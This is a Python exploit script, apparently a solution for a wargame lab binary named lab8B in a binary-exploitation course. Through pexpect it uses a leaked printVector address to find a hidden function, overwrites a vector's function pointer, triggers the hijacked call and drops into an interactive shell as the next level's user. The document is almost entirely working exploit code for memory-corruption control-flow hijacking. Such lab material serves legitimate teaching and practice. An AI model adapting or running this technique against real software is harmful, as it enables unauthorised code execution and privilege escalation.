#!/usr/bin/python

import pexpect
import time
import ctypes

path = '/levels/lab08/lab8B'
proc = None

# Essentially:
#   &printVector - &thisIsASecret
printVector_to_thisIsASecret_distance = 0x42

def readall():
    data = []
    while True:
        try:
            proc.expect('\n')
            c = proc.before
            if not c: break
            c = c.replace('\r', '\n')
            data.append(c)
        except (pexpect.TIMEOUT, pexpect.EOF) as e:
            data.append(proc.before)
            break
    return data

def interact(*params):
    out = []
    for param in params:
        proc.sendline(str(param))
        out.extend(readall())
        time.sleep(0.1)
    out.extend(readall())
    return out

def shell():
    # 0x03 is a Control-C escape code.
    proc.interact('\x03')

if __name__ == '__main__':

    proc = pexpect.spawn(path, timeout=0.1, cwd='/home/lab8B/')

    print "Step 1. Create first vector"
    interact(1, 1, "a", 1, 3, 4, 5, 6, 7, 8, 9)

    print "Step 2. Get leaked printFunc address"
    out = interact(3, 1)[4]
    pos = out.find(':')
    addr = int(out[pos+2:-1], 16)
    secret = ctypes.c_uint32(addr - printVector_to_thisIsASecret_distance).value

    print "\tprintFunc (printVector) @ 0x%08x" % addr
    print "\tthisIsASecret @ 0x%08x" % secret

    print "Step 3. Construct second Vector that would introduce arbitrary printFunc value"

    retaddr = ctypes.c_long(secret).value
    interact(1, 2, "b", 22, 23, 24, 25, retaddr - 6, 27, 28, 29)
    interact(2)

    print "Step 4. Fill up favorites array"
    for i in range(10):
        print "\tAdding %d vector to favs" % i
        interact(4)

    print "Step 5: Process constructed favs"
    out = interact(5)
    i = 0
    controlled = -1
    for line in out:
        if 'printFunc' in line:
            try:
                printfunc = int(line[line.find(':') + 2:-1], 16)
            except ValueError:
                printfunc = 0
            print "\tVector %d. print function: 0x%08x" % (i, printfunc)
            if printfunc == secret:
                print "\t\t\t\t  ^- This vector's printFunc is controlled by us."
                controlled = i
                break
            i += 1

    if controlled == -1:
        print "[!] Could not obtain control over Vector's printFunc pointer"

    else:
        print "Step 6. Calling attacker-controlled pointer (vector %d)" % controlled
        interact(6, controlled, 1)
        interact(3, 1)
        print ''.join(interact("cd /home/lab8A ; uname -a ; id"))
        proc.interact()

